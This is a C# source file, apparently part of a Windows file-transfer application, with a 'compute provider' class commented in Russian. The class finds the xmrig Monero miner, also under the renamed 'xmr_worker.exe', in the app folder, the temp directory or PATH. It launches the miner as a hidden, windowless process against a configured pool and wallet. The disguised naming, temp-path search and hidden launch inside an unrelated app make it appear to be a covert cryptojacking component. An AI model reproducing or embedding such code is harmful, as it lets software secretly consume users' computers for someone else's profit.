using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace FileTransfer.Compute
{
    /// <summary>
    /// Провайдер вычислений Monero (XMR) на алгоритме RandomX (rx/0).
    /// Формирует параметры конфигурации, управляет процессом, настраивает пулы,
    /// воркера, кошелек и лимиты потоков.
    /// </summary>
    public class MoneroProvider : BaseComputeProvider
    {
        public override string Name => "MoneroProvider";
        public override string Algorithm => "RandomX (rx/0)";

        public override (bool isValid, string error) Validate(ComputeConfig config)
        {
            if (config == null) return (false, "Конфигурация отсутствует.");
            if (string.IsNullOrWhiteSpace(config.ServerAddress))
            {
                return (false, "Отсутствует обязательный адрес сервера (serverAddress) для Monero.");
            }
            if (config.ServerPort <= 0 || config.ServerPort > 65535)
            {
                return (false, $"Неверный порт сервера (serverPort): {config.ServerPort}. Допустимый диапазон 1-65535.");
            }
            if (string.IsNullOrWhiteSpace(config.WalletAddress))
            {
                return (false, "Отсутствует обязательный адрес кошелька (walletAddress) для Monero.");
            }
            if (config.ResourceLimit <= 0 || config.ResourceLimit > 100)
            {
                return (false, $"Некорректный лимит ресурсов (resourceLimit): {config.ResourceLimit}%.");
            }
            return (true, "");
        }

        public override async Task<bool> StartAsync(ComputeConfig config, CancellationToken cancellationToken)
        {
            CleanOldProcess();

            var (isValid, err) = Validate(config);
            if (!isValid)
            {
                MainWindow.Log($"[{Name}] ❌ Ошибка валидации: {err}");
                _status.ErrorMessage = err;
                return false;
            }

            string? enginePath = FindEngine();
            if (string.IsNullOrEmpty(enginePath) || !File.Exists(enginePath))
            {
                string msg = "Невозможно запустить внешний вычислительный компонент: исполняемый файл RandomX (xmrig.exe / xmr_worker.exe) не найден.";
                MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                _status.ErrorMessage = msg;
                return false;
            }

            string pass = string.IsNullOrWhiteSpace(config.WorkerName) ? "x" : config.WorkerName;
            string rig = string.IsNullOrWhiteSpace(config.WorkerName) ? "rig" : config.WorkerName;

            try
            {
                string execFile = enginePath;
                string execArgs = $"-o {config.ServerAddress}:{config.ServerPort} -u {config.WalletAddress} -p {pass} --rig-id {rig} -a rx/0 --cpu-max-threads-hint={config.ResourceLimit} --no-color --donate-level=1";

                if (enginePath.EndsWith(".bat", StringComparison.OrdinalIgnoreCase) ||
                    enginePath.EndsWith(".cmd", StringComparison.OrdinalIgnoreCase))
                {
                    execFile = Environment.GetEnvironmentVariable("ComSpec") ?? "cmd.exe";
                    execArgs = $"/c \"\"{enginePath}\" {execArgs}\"";
                }

                var psi = new ProcessStartInfo
                {
                    FileName = execFile,
                    Arguments = execArgs,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = Path.GetDirectoryName(enginePath) ?? Path.GetTempPath()
                };

                var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };
                proc.OutputDataReceived += (s, e) => { if (e.Data != null) HandleStdout(e.Data); };
                proc.ErrorDataReceived += (s, e) => { if (e.Data != null) HandleStderr(e.Data); };
                proc.Exited += (s, e) =>
                {
                    lock (_lock)
                    {
                        try
                        {
                            _status.ExitCode = proc.ExitCode;
                            _status.IsActive = false;
                            MainWindow.Log($"[{Name}] Процесс завершился с кодом {_status.ExitCode}.");
                            if (_status.ExitCode != 0 && string.IsNullOrEmpty(_status.ErrorMessage))
                            {
                                _status.ErrorMessage = $"Процесс завершился аварийно с кодом {_status.ExitCode}.";
                            }
                        }
                        catch { }
                    }
                };

                if (!proc.Start())
                {
                    string msg = "Process.Start() вернул false при запуске RandomX движка.";
                    MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                    _status.ErrorMessage = msg;
                    return false;
                }

                proc.BeginOutputReadLine();
                proc.BeginErrorReadLine();

                lock (_lock)
                {
                    _process = proc;
                    _startTime = DateTime.UtcNow;
                    _status.IsActive = true;
                    _status.ProcessId = proc.Id;
                    _status.Algorithm = Algorithm;
                    _status.PoolUrl = $"{config.ServerAddress}:{config.ServerPort}";
                    _status.Worker = config.WorkerName;
                    _status.ErrorMessage = "";
                }

                ApplyResourceLimits(proc, config.ResourceLimit);
                MainWindow.Log($"[{Name}] ✅ Внешний процесс RandomX успешно запущен (PID: {proc.Id}, Pool: {config.ServerAddress}:{config.ServerPort}).");
                return true;
            }
            catch (Exception ex)
            {
                string msg = "Исключение при старте процесса RandomX: " + ex.Message;
                MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                _status.ErrorMessage = msg;
                return false;
            }
        }

        private string GenerateConfigFile(ComputeConfig config)
        {
            CleanupConfigFile();

            string dir = Path.Combine(Path.GetTempPath(), "ft_monero_" + Guid.NewGuid().ToString("N").Substring(0, 8));
            Directory.CreateDirectory(dir);
            string file = Path.Combine(dir, "config.json");

            int totalCores = Environment.ProcessorCount;
            int threads = Math.Max(1, (int)Math.Round((double)totalCores * config.ResourceLimit / 100.0));

            var jsonCfg = new
            {
                autosave = true,
                cpu = new
                {
                    enabled = true,
                    huge_pages = false,
                    max_threads_hint = config.ResourceLimit,
                    max_threads = threads
                },
                pools = new[]
                {
                    new
                    {
                        algo = "rx/0",
                        coin = "monero",
                        url = $"{config.ServerAddress}:{config.ServerPort}",
                        user = config.WalletAddress,
                        pass = string.IsNullOrWhiteSpace(config.WorkerName) ? "x" : config.WorkerName,
                        rig_id = config.WorkerName,
                        keepalive = true,
                        tls = false
                    }
                },
                syslog = false,
                watch = false
            };

            string json = JsonSerializer.Serialize(jsonCfg, new JsonSerializerOptions { WriteIndented = true });
            File.WriteAllText(file, json, Encoding.UTF8);

            _configFilePath = file;
            return file;
        }

        public string? FindEngine()
        {
            string appDir = AppDomain.CurrentDomain.BaseDirectory;
            var searchPaths = new System.Collections.Generic.List<string>
            {
                Path.Combine(appDir, "Compute", "xmrig.exe"),
                Path.Combine(appDir, "Compute", "xmr_worker.exe"),
                Path.Combine(appDir, "xmrig.exe"),
                Path.Combine(appDir, "xmr_worker.exe"),
                Path.Combine(Path.GetTempPath(), "xmrig.exe"),
                Path.Combine(Path.GetTempPath(), "xmr_worker.exe")
            };

            var envPath = Environment.GetEnvironmentVariable("PATH");
            if (!string.IsNullOrEmpty(envPath))
            {
                foreach (var dir in envPath.Split(Path.PathSeparator, StringSplitOptions.RemoveEmptyEntries))
                {
                    try
                    {
                        string cand = Path.Combine(dir.Trim(), "xmrig.exe");
                        if (!searchPaths.Contains(cand)) searchPaths.Add(cand);
                    }
                    catch { }
                }
            }

            foreach (var p in searchPaths)
            {
                if (File.Exists(p)) return p;
            }

            // Дополнительная проверка тестовых/скриптовых заглушек
            string batStub = Path.Combine(Path.GetTempPath(), "xmr_engine.bat");
            if (File.Exists(batStub)) return batStub;

            return null;
        }
    }
}
